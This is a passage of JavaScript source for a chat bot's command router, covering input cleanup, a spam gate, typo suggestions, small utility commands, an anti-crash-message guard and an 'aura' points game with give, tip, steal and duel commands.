// ============ COMMAND ROUTER ============
// ═══════════════════════════════════════════════════════════════════
//  🛡️ COMMAND HARDENING LAYER — wraps every command with: input cleanup, crash protection,
//  typo suggestions ("did you mean"), a spam/rate gate, plus extra helpful utility commands.
// ═══════════════════════════════════════════════════════════════════
const _CMD_FILE_EXT = new Set(['.jpg','.jpeg','.png','.webp','.gif','.mp3','.mp4','.m4a','.ogg','.opus','.wav','.pdf','.txt','.json','.js',
  '.db','.env','.bin','.csv','.zip','.ts','.mjs','.cjs','.html','.css','.md','.log','.tmp','.wal','.shm','.mov','.avi','.mkv','.webm','.sqlite']);
let _KNOWN_CMDS = null;
function knownCmds() {
  if (_KNOWN_CMDS) return _KNOWN_CMDS;
  const set = new Set();
  try {
    const src = fs.readFileSync(__filename, 'utf8');
    for (const m of src.matchAll(/['"`](\.[a-z][a-z0-9_]{1,19})['"`]/g)) if (!_CMD_FILE_EXT.has(m[1])) set.add(m[1]);
  } catch (_) {}
  _KNOWN_CMDS = set;
  return set;
}
function _lev(a, b) {
  if (Math.abs(a.length - b.length) > 3) return 99;
  const d = Array.from({ length: a.length + 1 }, (_, i) => [i]);
  for (let j = 1; j <= b.length; j++) d[0][j] = j;
  for (let i = 1; i <= a.length; i++) for (let j = 1; j <= b.length; j++)
  {
    d[i][j] = Math.min(d[i - 1][j] + 1, d[i][j - 1] + 1, d[i - 1][j - 1] + (a[i - 1] === b[j - 1] ? 0 : 1));
    if (i > 1 && j > 1 && a[i - 1] === b[j - 2] && a[i - 2] === b[j - 1]) d[i][j] = Math.min(d[i][j], d[i - 2][j - 2] + 1); // swapped letters count as one typo
  }
  return d[a.length][b.length];
}
function suggestCmd(word) {
  const max = word.length <= 4 ? 1 : 2;
  const out = [];
  for (const c of knownCmds()) { const dist = _lev(word, c); if (dist <= max) out.push([dist, c]); }
  return out.sort((x, y) => x[0] - y[0] || x[1].length - y[1].length).slice(0, 3).map(x => x[1]);
}

// Spam gate: more than 8 commands in 8 seconds -> 20s cooldown (owner/sudo exempt). 0 = ok, 1 = tell them, 2 = stay silent.
const _cmdHits = new Map();
function _cmdGate(userId) {
  try { if (isSudo(userId)) return 0; } catch (_) {}
  const now = Date.now();
  let h = _cmdHits.get(userId);
  if (!h) { h = { t: [], until: 0, told: false }; _cmdHits.set(userId, h); }
  if (now < h.until) { if (!h.told) { h.told = true; return 1; } return 2; }
  if (h.told) h.told = false;
  h.t = h.t.filter(x => now - x < 8000); h.t.push(now);
  if (h.t.length > 8) { h.until = now + 20000; h.told = true; h.t = []; return 1; }
  if (_cmdHits.size > 2000) for (const [k, v] of _cmdHits) if (now > v.until && now - (v.t[v.t.length - 1] || 0) > 60000) _cmdHits.delete(k);
  return 0;
}

function _ymd(str) {
  let m = String(str || '').match(/^(\d{4})-(\d{1,2})-(\d{1,2})$/);
  if (m) return [+m[1], +m[2], +m[3]];
  m = String(str || '').match(/^(\d{1,2})[\/.-](\d{1,2})[\/.-](\d{4})$/);
  return m ? [+m[3], +m[2], +m[1]] : null;
}
function _validDate(y, mo, d) {
  const dt = new Date(Date.UTC(y, mo - 1, d));
  return dt.getUTCFullYear() === y && dt.getUTCMonth() === mo - 1 && dt.getUTCDate() === d ? dt : null;
}
const _fmtN = n => Number(n).toLocaleString('en-US', { maximumFractionDigits: 2 });

// Extra helpful commands. Returns a string, or null when the command isn't one of these.
function _extraCommands(t) {
  const parts = t.trim().split(/\s+/);
  let cmd = (parts[0] || '').toLowerCase();
  if (cmd.startsWith('/')) cmd = '.' + cmd.slice(1);
  const args = parts.slice(1);
  const rest = t.replace(/^\s*\S+\s*/, '').trim();
  const num = x => { const n = Number(String(x || '').replace(/,/g, '')); return Number.isFinite(n) ? n : NaN; };

  if (cmd === '.uptime') {
    let on = 0; try { on = [...sessions.values()].filter(x => x && x.connected).length; } catch (_) {}
    return `⏱️ *Uptime:* ${fmtUptime()}\n📱 *Linked accounts online:* ${on}`;
  }
  if (cmd === '.cmd' || cmd === '.findcmd') {
    const q = (args[0] || '').toLowerCase().replace(/^[./]/, '');
    if (q.length < 2) return '🔎 .cmd <word> — search commands. e.g. .cmd group';
    const hits = [...knownCmds()].filter(c => c.slice(1).includes(q)).sort().slice(0, 30);
    if (!hits.length) { const sg = suggestCmd('.' + q); return `🔎 Nothing matches "${q}".${sg.length ? ' Did you mean ' + sg.join(', ') + '?' : ''}`; }
    return `🔎 *Commands matching "${q}"* (${hits.length})\n\n${hits.join('  ')}`;
  }
  if (cmd === '.random') {
    let lo = args.length >= 2 ? num(args[0]) : 1, hi = args.length >= 2 ? num(args[1]) : (args.length ? num(args[0]) : 100);
    if (!Number.isFinite(lo) || !Number.isFinite(hi)) return '🎲 .random [min] [max] — e.g. .random 1 50';
    lo = Math.trunc(lo); hi = Math.trunc(hi);
    if (Math.abs(lo) > 1e9 || Math.abs(hi) > 1e9) return '🎲 Keep numbers between -1,000,000,000 and 1,000,000,000.';
    if (lo > hi) [lo, hi] = [hi, lo];
    return `🎲 ${lo + Math.floor(Math.random() * (hi - lo + 1))}  _(${lo}–${hi})_`;
  }
  if (cmd === '.age') {
    const d = _ymd(args[0]);
    const dt = d && _validDate(...d);
    if (!dt) return '🎂 .age <YYYY-MM-DD> — e.g. .age 2001-05-23';
    const now = new Date();
    if (dt > now || now.getUTCFullYear() - d[0] > 130) return '🎂 That birth date doesn\'t look right.';
    let years = now.getUTCFullYear() - d[0], months = now.getUTCMonth() + 1 - d[1], days = now.getUTCDate() - d[2];
    if (days < 0) { months--; days += new Date(Date.UTC(now.getUTCFullYear(), now.getUTCMonth(), 0)).getUTCDate(); }
    if (months < 0) { years--; months += 12; }
    const today = Date.UTC(now.getUTCFullYear(), now.getUTCMonth(), now.getUTCDate());
    let nb = Date.UTC(now.getUTCFullYear(), d[1] - 1, d[2]); if (nb < today) nb = Date.UTC(now.getUTCFullYear() + 1, d[1] - 1, d[2]);
    const left = Math.round((nb - today) / 86400000);
    return `🎂 *Age:* ${years} years, ${months} months, ${days} days\n📅 Lived: ${_fmtN(Math.floor((today - dt.getTime()) / 86400000))} days\n🎉 Next birthday: ${left === 0 ? 'TODAY! 🥳' : left + ' day' + (left === 1 ? '' : 's')}`;
  }
  if (cmd === '.daysuntil') {
    const d = _ymd(args[0]);
    const dt = d && _validDate(...d);
    if (!dt) return '📅 .daysuntil <YYYY-MM-DD> — e.g. .daysuntil 2026-12-25';
    const now = new Date();
    const diff = Math.round((dt.getTime() - Date.UTC(now.getUTCFullYear(), now.getUTCMonth(), now.getUTCDate())) / 86400000);
    return diff === 0 ? '📅 That\'s TODAY!' : diff > 0 ? `📅 ${_fmtN(diff)} day${diff === 1 ? '' : 's'} to go` : `📅 That was ${_fmtN(-diff)} day${diff === -1 ? '' : 's'} ago`;
  }
  if (cmd === '.bmi') {
    const kg = num(args[0]), cm = num(args[1]);
    if (!(kg >= 10 && kg <= 500) || !(cm >= 50 && cm <= 260)) return '⚖️ .bmi <kg> <cm> — e.g. .bmi 70 175';
    const b = kg / ((cm / 100) ** 2);
    const cat = b < 18.5 ? 'Underweight' : b < 25 ? 'Healthy' : b < 30 ? 'Overweight' : 'Obese';
    return `⚖️ *BMI:* ${b.toFixed(1)} — ${cat}\n_General guide only, not medical advice._`;
  }
  if (cmd === '.tipcalc') {
    const bill = num(args[0]), pct = args[1] === undefined ? 10 : num(args[1]), ppl = args[2] === undefined ? 1 : Math.trunc(num(args[2]));
    if (!(bill > 0) || !(pct >= 0 && pct <= 100) || !(ppl >= 1 && ppl <= 100) || bill > 1e12) return '💵 .tipcalc <bill> [tip%] [people] — e.g. .tipcalc 5000 10 3';
    const tip = bill * pct / 100, total = bill + tip;
    return `💵 *Tip:* ${_fmtN(tip)}\n🧾 *Total:* ${_fmtN(total)}${ppl > 1 ? `\n👥 *Each (${ppl}):* ${_fmtN(total / ppl)}` : ''}`;
  }
  if (cmd === '.percent') {
    const x = num(args[0]), y = num(args[1]);
    if (!Number.isFinite(x) || !Number.isFinite(y)) return '➗ .percent <x> <y> — e.g. .percent 15 200';
    return `➗ ${_fmtN(x)}% of ${_fmtN(y)} = *${_fmtN(x * y / 100)}*${x !== 0 ? `\n➗ ${_fmtN(y)} is *${_fmtN(y / x * 100)}%* of ${_fmtN(x)}` : ''}`;
  }
  if (cmd === '.base64') {
    const mode = (args[0] || '').toLowerCase();
    const body = rest.replace(/^\S+\s*/, '');
    if (!['enc', 'encode', 'dec', 'decode'].includes(mode) || !body) return '🔐 .base64 encode <text>  ·  .base64 decode <code>';
    if (body.length > 4000) return '🔐 That\'s too long (max 4000 characters).';
    if (mode.startsWith('enc')) return '🔐 ' + Buffer.from(body, 'utf8').toString('base64');
    if (!/^[A-Za-z0-9+/=_-]+$/.test(body.replace(/\s+/g, ''))) return '🔐 That doesn\'t look like valid base64.';
    const out = Buffer.from(body.replace(/\s+/g, ''), 'base64').toString('utf8');
    return out.includes('\uFFFD') || !out ? '🔐 That doesn\'t decode to readable text.' : '🔐 ' + out.slice(0, 1500);
  }
  if (['.reverse', '.upper', '.lower', '.count'].includes(cmd)) {
    if (!rest) return `✏️ ${cmd} <text>`;
    const body = rest.slice(0, 4000);
    if (cmd === '.reverse') return '🔁 ' + [...body].reverse().join('');
    if (cmd === '.upper') return '🔠 ' + body.toUpperCase();
    if (cmd === '.lower') return '🔡 ' + body.toLowerCase();
    return `🔢 *Characters:* ${[...body].length}\n📝 *Words:* ${body.split(/\s+/).filter(Boolean).length}\n📄 *Lines:* ${body.split(/\r?\n/).length}`;
  }
  if (cmd === '.timezone') {
    const tz = args[0];
    if (!tz) return '🌍 .timezone <Region/City> — e.g. .timezone Africa/Lagos, Europe/London, America/New_York, Asia/Tokyo';
    try {
      const out = new Intl.DateTimeFormat('en-GB', { timeZone: tz, weekday: 'long', year: 'numeric', month: 'long', day: 'numeric', hour: '2-digit', minute: '2-digit' }).format(new Date());
      return `🌍 *${tz}*\n🕒 ${out}`;
    } catch (_) { return '🌍 Unknown time zone. Use the Region/City form, e.g. Africa/Lagos or Europe/London.'; }
  }
  return null;
}

async function handleCommand(text, chatId, userId, name, rawUserId, mentionedJids = []) {
  let t = String(text ?? '');
  if (t.length > 4000) t = t.slice(0, 4000);
  // clean the command word (invisible characters, full-width dots) and cap runaway numbers so amounts can't overflow
  const m = t.match(/^(\s*)(\S+)([\s\S]*)$/);
  if (m) {
    let w = m[2];
    try { w = w.normalize('NFKC'); } catch (_) {}
    w = w.replace(/[\u200B-\u200F\u202A-\u202E\u2060-\u206F\uFEFF\u00AD]/g, '');
    t = w + m[3].replace(/\d{16,}/g, d => d.slice(0, 15));
  }
  try {
    const extra = _extraCommands(t);
    if (extra) return extra;
    const r = await _handleCommandCore(t, chatId, userId, name, rawUserId, mentionedJids);
    if (r) return r;
    const w0 = t.trim().split(/\s+/)[0].toLowerCase().replace(/^\//, '.');
    if (/^\.[a-z][a-z0-9_]{1,19}$/.test(w0) && !knownCmds().has(w0)) {
      const sg = suggestCmd(w0);
      if (sg.length) return `🤔 Unknown command *${w0}*. Did you mean ${sg.map(x => '*' + x + '*').join(' or ')}?`;
    }
    return r;
  } catch (e) {
    console.error('[cmd error]', String(t).slice(0, 40), (e && e.stack ? e.stack.split('\n').slice(0, 2).join(' | ') : e));
    return '⚠️ That command hit a problem and was stopped safely. Please try again in a moment.';
  }
}

async function _handleCommandCore(text, chatId, userId, name, rawUserId, mentionedJids=[]) {
  const parts=text.trim().split(/\s+/);
  let cmd=parts[0].toLowerCase();
  if(cmd.startsWith('/')) cmd='.'+cmd.slice(1);
  const args=parts.slice(1);
  // ── Menus ──
  if(['.help','.menu','.commands','.start'].includes(cmd)) return helpMenu();
  if(cmd==='.antibug' || cmd==='.clearbug' || cmd==='.bugclear') {
    const c = _selfCtx.getStore() || {};
    if (!(isSudo(userId) || c.linked)) return '❌ Only the owner of this linked account (or sudo) can change antibug.';
    if (!c.sess) return '❌ Antibug works on linked WhatsApp accounts only.';
    const a = (cmd === '.clearbug' || cmd === '.bugclear') ? 'clear' : String(args[0] || '').toLowerCase();
    if (a === 'clear' || a === 'clearall') {
      if (!c.sock) return '❌ No linked WhatsApp connection found to clear.';
      // look through the saved copies of messages for bug payloads, then wipe the cache
      let flagged = 0, total = 0;
      try {
        for (const [, sess] of sessions.entries()) {
          if (sess?.sock !== c.sock || !sess.msgStore) continue;
          for (const jidK of Object.keys(sess.msgStore)) for (const [, m] of Object.entries(sess.msgStore[jidK] || {})) { total++; try { if (antibugDetect(m)) flagged++; } catch (_) {} }
        }
      } catch (_) {}
      const wiped = _abPurge(c.sock, a === 'clearall' ? null : chatId);
      return `🧹 *Bug clear done*\n• scanned ${total} saved messages, found ${flagged} bug payload${flagged === 1 ? '' : 's'}\n• wiped ${wiped} saved message copies ${a === 'clearall' ? '(everything)' : '(this chat)'}\n\nNew bug messages are still cleared automatically while antibug is ON. If WhatsApp itself still lags, clear that chat from the chat menu on your phone.`;
    }
    if (a === 'on' || a === 'off') { antibugSet(c.sess, a === 'on'); return `🐛 Antibug turned ${a}.`; }
    if (a === 'log') {
      const L = (_abCfg.log || []).slice(-5).reverse();
      if (!L.length) return '🐛 No bug attacks caught yet.';
      return '🐛 *Last attacks caught*\n\n' + L.map(x => `• ${new Date(x.t).toLocaleString()} — +${x.who} (${x.where})\n  ${x.reason}`).join('\n');
    }
    const on = !_abCfg.off.includes(c.sess);
    return `🐛 *ANTIBUG* is ${on ? 'ON ✅' : 'OFF ❌'} for this account\n\nWhen a bug/crash message arrives I:\n• clear it from your device\n• lock the group, kick the sender & delete it for everyone _(if I'm admin)_\n• block the sender (auto-unblock after 10 min)\n\nUse .antibug on / off / log`;
  }
  if(['.grouphelp','.groupmenu'].includes(cmd)) return groupHelp();
  if(['.economymenu','.ecomenu','.economy'].includes(cmd)) return economyMenu();
  if(['.stocksmenu','.stockmenu'].includes(cmd)) return stocksMenu();
  if(['.guildsmenu','.guildmenu'].includes(cmd)) return guildsMenu();
  if(['.gamesmenu','.moregames'].includes(cmd)) return newGamesMenu();
  if(['.extrasmenu','.extras'].includes(cmd)) return extrasMenu();
  if(['.adminmenu','.adminhelp','.ahelp'].includes(cmd)) return adminMenu();
  if(['.personalhelp','.myhelp'].includes(cmd)) return personalHelp();
  if(['.downloadmenu','.dlmenu'].includes(cmd)) return downloadMenu();
  if(['.notesmenu','.noteshelp'].includes(cmd)) return notesMenu();
  if(['.toolsmenu','.toolshelp'].includes(cmd)) return toolsMenu();
  if(['.premiummenu','.premium','.premiumhelp','.phelp'].includes(cmd)) return premiumMenu();
  if(cmd==='.job') cmd='.jobs'; // alias
  if(cmd==='.application') cmd='.applications'; // alias
  if(['.jobmenu','.staffhelp','.jobs'].includes(cmd)) { const jb=handleJobs(cmd,userId,name,chatId,args); if(jb) return jb; }
  { const _occ = handleOccupations(cmd, userId, name, chatId, args, mentionedJids); if (_occ) return _occ; }
  if(['.ownerinfo','.owner'].includes(cmd)) return ownerInfo();
  { const _vx = await handleVoiceExtras(cmd, args, userId); if (_vx) return _vx; }
  { const _an = await handleAnon(cmd, args, userId, name, chatId); if (_an) return _an; }
  { const _ut = await handleUtilities(cmd, args, userId, name, chatId, text); if (_ut) return _ut; }

  // ── Debug: show exact IDs the bot sees for this sender ──────────────────
  if (cmd === '.myid') {
    return `🔍 *Your bot IDs*\nrawUserId: \`${rawUserId}\`\nresolved userId: \`${userId}\`\nisOwner: ${isOwner(userId)}\nMY_WA: \`${MY_WA}\``;
  }

  // ── Game help menus ──

  // ── AURA / REALM / CYCLES ──
  if(['.aura','/aura'].includes(cmd)) return cmdAura(args, userId, name);
  if(['.buffs','/buffs'].includes(cmd)) return cmdBuffs(args, userId, name);
  if(['.realm','/realm'].includes(cmd)) return cmdRealm(args, userId, name);
  if(['.realms','/realms'].includes(cmd)) return cmdRealms();
  if(['.stats','/stats'].includes(cmd)) return cmdStats(userId, name);
  if(['.solar','/solar'].includes(cmd)) return cmdSolar();
  if(['.lunar','/lunar'].includes(cmd)) return cmdLunar();
  if(['.claim','/claim'].includes(cmd)) return cmdClaim(userId, name);
  if(['.task','/task'].includes(cmd)) return cmdTask(userId, name);
  if(['.multipliers','/multipliers'].includes(cmd)) return cmdMultipliers(userId, name);
  if(['.titles','/titles'].includes(cmd)) return cmdTitles(userId, name);
  if(['.title','/title'].includes(cmd)) return cmdTitle(args, userId);

  // ── AURA FARMING COMMANDS ────────────────────────────────────────────────────
  // These are the core commands for earning aura fast on both WhatsApp and Telegram.
  // All respect realm limits and solar/lunar cycle bonuses.

  // Helper: resolve target user from @mention or name for aura commands
  function _resolveAuraTarget(targetArg) {
    if (!targetArg) return null;
    if (targetArg.startsWith('@') && mentionedJids.length > 0) {
      const realJid = mentionedJids[0];
      const realNum = realJid.replace('@s.whatsapp.net','').replace(/\D/g,'');
      const uid = resolveId('wa_' + realNum) || ('wa_' + realNum);
      return db.prepare('SELECT * FROM users WHERE id=?').get(uid)
          || db.prepare('SELECT * FROM users WHERE id=?').get('wa_' + realNum);
    }
    if (targetArg.startsWith('@')) {
      const digits = targetArg.replace(/\D/g,'');
      const uid = resolveId('wa_' + digits) || ('wa_' + digits);
      return db.prepare('SELECT * FROM users WHERE id=?').get(uid)
          || db.prepare('SELECT * FROM users WHERE id=?').get('wa_' + digits);
    }
    return db.prepare("SELECT * FROM users WHERE LOWER(name)=LOWER(?) LIMIT 1").get(targetArg);
  }

  // ── .agive / /agive — Give aura to someone (both earn realm XP) ─────────────
  if (['.agive', '/agive', '.aura give', '.sendaura'].includes(cmd)) {
    const au = getAuraUser(userId);
    const realm = getRealmInfo(au.realm);
    const solar = getSolarTier(userId);
    const lunar = getLunarTier(userId);
    const own2 = isOwner(userId) && OWNER_GOD_MODE;

    const targetArg = args[0];
    const rawAmt = parseInt(args[1]);
    if (!targetArg || !rawAmt || rawAmt <= 0)
      return `✨ *.agive <name> <amount>*\n\nGive aura to someone — they receive it, you earn a bonus!\n\n🌌 Your realm limit: ${realm.give} aura/give\n\nExample: .agive Sean 200`;

    // Realm daily give limit — track via notes
    const giveKey = `__aura_give_${new Date().toDateString()}__`;
    const giveRow = db.prepare("SELECT content FROM notes WHERE user_id=? AND title=?").get(userId, giveKey);
    const givenToday = parseInt(giveRow?.content || 0);
    const limit = own2 ? 999999 : realm.give;
    if (givenToday + rawAmt > limit && !own2)
      return `❌ Give limit reached for today!\nLimit: ${limit} · Given: ${givenToday} · Remaining: ${Math.max(0, limit-givenToday)}\n\nUpgrade realm for higher limits: .realm`;

    const target = _resolveAuraTarget(targetArg);
    if (!target) return `❄️ user "${targetArg}" not found. They need to have chatted with the bot first.`;
    if (target.id === userId) return '😒 you cannot give aura to yourself.';

    // Apply solar/lunar bonus multipliers
    const sBonus  = solar  ? (1 + solar.give  / 100) : 1;
    const lBonus  = lunar  ? (1 + lunar.give  / 100) : 1;
    const baseAmt = Math.min(rawAmt, limit - givenToday);
    const senderBonus = Math.floor(baseAmt * 0.10 * sBonus * lBonus); // sender earns 10% back

    addAura(target.id, baseAmt);
    addAura(userId, senderBonus); // sender earns farming bonus for being generous

    // Track today's give total
    db.prepare("INSERT OR REPLACE INTO notes (user_id,title,content,created_at) VALUES (?,?,?,?)")
      .run(userId, giveKey, String(givenToday + baseAmt), new Date().toISOString());

    const bonusLine = senderBonus > 0 ? `\n✨ You earned +${senderBonus} aura (10% generosity bonus)` : '';
    const solarLine = solar ? `\n☀️ Solar ${solar.star}${solar.name}: +${solar.give}% give boost active` : '';
    return `✨ *AURA GIVEN!*\n\n👤 Sent: ${fmtAura(baseAmt)} → ${target.name}${bonusLine}${solarLine}\n\n📊 Given today: ${givenToday+baseAmt}/${limit}\n.realm to see your daily limits`;
  }

  // ── .atip / /atip — Quick tip (small, free, limited 12–18 times/day by realm) ─
  if (['.atip', '/atip', '.tipa', '.tip'].includes(cmd)) {
    const au = getAuraUser(userId);
    const realm = getRealmInfo(au.realm);
    const solar = getSolarTier(userId);
    const lunar = getLunarTier(userId);
    const own2 = isOwner(userId) && OWNER_GOD_MODE;

    const targetArg = args[0];
    if (!targetArg)
      return `✨ *.atip <name>*\n\nTip someone a small amount of aura for free!\n\n💰 Tip amount: 10–30 aura\n📊 Daily tips: ${realm.tips}/day\n\nExample: .atip Sean`;

    // Tips per day limit
    const tipKey = `__aura_tips_${new Date().toDateString()}__`;
    const tipRow = db.prepare("SELECT content FROM notes WHERE user_id=? AND title=?").get(userId, tipKey);
    const tipsToday = parseInt(tipRow?.content || 0);
    const tipLimit = own2 ? 999 : realm.tips;
    if (tipsToday >= tipLimit && !own2)
      return `❌ Daily tip limit reached! (${tipLimit}/day)\nCome back tomorrow or upgrade your realm.`;

    const target = _resolveAuraTarget(targetArg);
    if (!target) return `❄️ user "${targetArg}" not found.`;
    if (target.id === userId) return '😒 you cannot tip yourself.';

    const sBonus = solar ? (1 + solar.tip / 100) : 1;
    const lBonus = lunar ? (1 + lunar.tip / 100) : 1;
    const tipAmt = Math.floor(randomInt(10, 30) * sBonus * lBonus);
    const selfBonus = Math.floor(tipAmt * 0.05); // 5% self-reward for tipping

    addAura(target.id, tipAmt);
    if (selfBonus > 0) addAura(userId, selfBonus);

    db.prepare("INSERT OR REPLACE INTO notes (user_id,title,content,created_at) VALUES (?,?,?,?)")
      .run(userId, tipKey, String(tipsToday + 1), new Date().toISOString());

    const selfLine = selfBonus > 0 ? ` (you earned +${selfBonus})` : '';
    return `💸 ${name} tipped ${target.name} ${fmtAura(tipAmt)}${selfLine}\nTips left today: ${tipLimit - tipsToday - 1}`;
  }

  // ── .asteal / /asteal — Steal aura from someone (risky, realm-limited) ───────
  if (['.asteal', '/asteal', '.aura steal', '.stealura'].includes(cmd)) {
    const au = getAuraUser(userId);
    const realm = getRealmInfo(au.realm);
    const solar = getSolarTier(userId);
    const lunar = getLunarTier(userId);
    const own2 = isOwner(userId) && OWNER_GOD_MODE;

    const targetArg = args[0];
    if (!targetArg)
      return `🥷 *.asteal <name>*\n\nSteal aura from someone — high risk, high reward!\n\n🌌 Steal limit per attempt: ${realm.steal}\n⚠️ Fail penalty: You lose aura instead\n\nExample: .asteal Sean`;

    // Cooldown: 30 min between steal attempts
    const stealCdKey = `__asteal_cd__`;
    const stealCdRow = db.prepare("SELECT content FROM notes WHERE user_id=? AND title=?").get(userId, stealCdKey);
    if (stealCdRow && !own2) {
      const minsAgo = (Date.now() - new Date(stealCdRow.content).getTime()) / 60000;
      if (minsAgo < 30) return `⏳ aura steal cooldown: ${Math.ceil(30 - minsAgo)} min left.`;
    }

    const target = _resolveAuraTarget(targetArg);
    if (!target) return `❄️ user "${targetArg}" not found.`;
    if (target.id === userId) return '😒 you cannot steal from yourself.';

    const victimAura = getAuraUser(target.id);
    if ((victimAura.aura || 0) < 10) return `❄️ ${target.name} has barely any aura to steal.`;

    // Success rate: base 45%, boosted by solar/lunar tier
    const sBonus = solar ? solar.stealSucc / 100 : 0;
    const lBonus = lunar ? lunar.stealSucc / 100 : 0;
    const successRate = Math.min(0.80, 0.45 + sBonus + lBonus);
    const success = own2 || Math.random() < successRate;

    db.prepare("INSERT OR REPLACE INTO notes (user_id,title,content,created_at) VALUES (?,?,?,?)")
      .run(userId, stealCdKey, new Date().toISOString(), new Date().toISOString());

    if (success) {
      const stealAmt = Math.min(
        Math.floor(randomInt(50, realm.steal) * (1 + sBonus + lBonus)),
        victimAura.aura || 0
      );
      addAura(userId, stealAmt);
      addAura(target.id, -stealAmt);
      const solarLine = solar ? ` [☀️${solar.star}${solar.name}: +${solar.stealSucc}% steal rate]` : '';
      return `🥷 *AURA STOLEN!*\n\n${name} stole ${fmtAura(stealAmt)} from ${target.name}!${solarLine}\n\n💡 Cooldown: 30 min`;
    } else {
      // Fail — lose some aura as penalty
      const failLoss = Math.floor(randomInt(20, 80) * (1 + Math.abs(solar?.stealFail || 0) / 100));
      addAura(userId, -failLoss);
      return `❌ *STEAL FAILED!*\n\n${target.name} caught you. Lost ${fmtAura(failLoss)} as penalty.\n\n💡 Cooldown: 30 min`;
    }
  }

  // ── .aduel / /aduel — Aura duel against another user ────────────────────────
  if (['.aduel', '/aduel', '.aura duel'].includes(cmd)) {
    const au = getAuraUser(userId);
    const realm = getRealmInfo(au.realm);
    const solar = getSolarTier(userId);
    const lunar = getLunarTier(userId);
    const own2 = isOwner(userId) && OWNER_GOD_MODE;

    const targetArg = args[0];
    const rawAmt = parseInt(args[1]);
    if (!targetArg || !rawAmt || rawAmt <= 0)
      return `⚔️ *.aduel <name> <amount>*\n\nChallenge someone to an aura duel!\nWinner takes the pot + 20% bonus.\n\n🌌 Max duel amount: ${realm.duel}\n\nExample: .aduel Sean 300`;

    const own3 = isOwner(userId) && OWNER_GOD_MODE;
    const betAmt = Math.min(rawAmt, own3 ? rawAmt : realm.duel);
    if (betAmt <= 0) return `❌ minimum bet is 1 aura.`;

    if ((au.aura || 0) < betAmt && !own3)
      return `❌ not enough aura. you have ${fmtAura(au.aura)}`;

    if (pendingDuels[chatId]) return '❄️ a duel is already pending. (.aduel or .duel)';

    const target = _resolveAuraTarget(targetArg);
    if (!target) return `❄️ user "${targetArg}" not found.`;
    if (target.id === userId) return '😒 you cannot duel yourself.';

    pendingDuels[chatId] = {
      challenger: userId, challengerName: name,
      target: target.name.toLowerCase(),
      targetUserId: target.id,
      amount: betAmt, expires: Date.now() + 60000,
      type: 'aura', // distinguish from naura duels
    };
    return `⚔️ *AURA DUEL!*\n\n${name} challenges ${target.name}!\n💠 Bet: ${fmtAura(betAmt)}\n\n${target.name}, type .aaccept to fight or .adecline to back down.\n_(60 seconds to respond)_`;
  }

  // ── .aaccept / .adecline — Accept or decline an aura duel ───────────────────
  if (['.aaccept', '/aaccept'].includes(cmd)) {
    const d = pendingDuels[chatId];
    if (!d || d.type !== 'aura') return '...no aura duel pending. try .aduel <name> <amount>';
    if (Date.now() > d.expires) { delete pendingDuels[chatId]; return '❄️ aura duel expired.'; }
    if (userId !== d.targetUserId && name.toLowerCase() !== d.target) return `...that duel wasn't for you.`;

    const tv = getAuraUser(userId);
    const own2 = isOwner(userId) && OWNER_GOD_MODE;
    if ((tv.aura || 0) < d.amount && !own2)
      return `not enough aura to accept. need ${fmtAura(d.amount)}. you have ${fmtAura(tv.aura)}`;

    delete pendingDuels[chatId];
    const solar = getSolarTier(userId);
    const lunar = getLunarTier(userId);
    const sBonus = solar ? solar.duel / 100 : 0;
    const lBonus = lunar ? lunar.duel / 100 : 0;
    const cWins = own2 || (Math.random() + sBonus + lBonus) < 0.5 + sBonus + lBonus;
    const bonus = Math.floor(d.amount * 0.20); // 20% winner bonus

    if (cWins) {
      addAura(d.challenger, d.amount + bonus);
      addAura(userId, -d.amount);
      return `⚔️ *AURA DUEL RESULT*\n\n${d.challengerName} vs ${name}\n🏆 *${d.challengerName} WINS!*\n\n+${fmtAura(d.amount + bonus)} → ${d.challengerName}\n-${fmtAura(d.amount)} from ${name}`;
    } else {
      addAura(userId, d.amount + bonus);
      addAura(d.challenger, -d.amount);
      return `⚔️ *AURA DUEL RESULT*\n\n${d.challengerName} vs ${name}\n🏆 *${name} WINS!*\n\n+${fmtAura(d.amount + bonus)} → ${name}\n-${fmtAura(d.amount)} from ${d.challengerName}`;
    }
  }
  if (['.adecline', '/adecline'].includes(cmd)) {
    const d = pendingDuels[chatId];
    if (!d || d.type !== 'aura') return '...no aura duel pending.';
    if (userId !== d.targetUserId && name.toLowerCase() !== d.target) return `...not your duel.`;
    delete pendingDuels[chatId];
    return `😒 ${name} backed down. coward energy.`;
  }

  // ── .auraboard / .auratop — Top aura holders ────────────────────────────────
  if (['.auraboard', '/auraboard', '.auratop', '/auratop', '.aularank', '.aurank'].includes(cmd)) {
    const top = db.prepare(`
      SELECT au.user_id, au.aura, au.realm, u.name
      FROM aura_users au LEFT JOIN users u ON au.user_id=u.id
      WHERE au.privacy=0
      ORDER BY au.aura DESC LIMIT 10
    `).all();
    if (!top.length) return `✨ No aura data yet. Use .claim to start!`;
    const rows = top.map((r, i) => {
      const medal = i===0?'🥇':i===1?'🥈':i===2?'🥉':`${i+1}.`;
      return `${medal} ${r.name||r.user_id} — ${fmtAura(r.aura)} [${r.realm||'Mortal'}]`;
    });
    // Find caller's own rank
    const myPos = db.prepare("SELECT COUNT(*)+1 as r FROM aura_users WHERE aura>(SELECT COALESCE(aura,0) FROM aura_users WHERE user_id=?) AND privacy=0").get(userId);
    const myAu = getAuraUser(userId);
    return `✨ *AURA LEADERBOARD*\n━━━━━━━━━━━━━━━\n${rows.join('\n')}\n\n📊 Your rank: #${myPos?.r||'?'} · ${fmtAura(myAu.aura)}`;
  }

  // ── .aurafarm / /aurafarm — Full farming guide ───────────────────────────────
  if (['.aurafarm', '/aurafarm', '.farmguide', '.aurahelp'].includes(cmd)) {
    const au = getAuraUser(userId);
    const realm = getRealmInfo(au.realm);
    return `✨ *AURA FARMING GUIDE — ${name}*
━━━━━━━━━━━━━━━
🌌 Realm: *${au.realm}* · Aura: ${fmtAura(au.aura)}

📅 *DAILY ACTIONS (free)*
.claim — ${fmtAura(100)}–${fmtAura(500)} daily (x multiplier if active)
.task — complete 3 tasks for ${fmtAura(600)} total
.atip <name> — tip someone free (${realm.tips}×/day, earn 5% back)

💠 *SOCIAL FARMING*
.agive <name> <amt> — give aura (you earn 10% back, limit: ${realm.give}/day)
.aduel <name> <amt> — duel for aura (winner gets +20% bonus, limit: ${realm.duel})

🥷 *RISKY FARMING*
.asteal <name> — steal aura (45%+ success, cooldown: 30 min)
Fail = you lose aura. Solar/Lunar tier raises your success rate.

☀️🌙 *CYCLE BONUSES*
.solar — weekly rankings (top = +20% all aura gains)
.lunar — monthly rankings (top = +30% all aura gains)

🔷 *CONVERT*
.shard <amount> — forge 1 shard per 100 aura

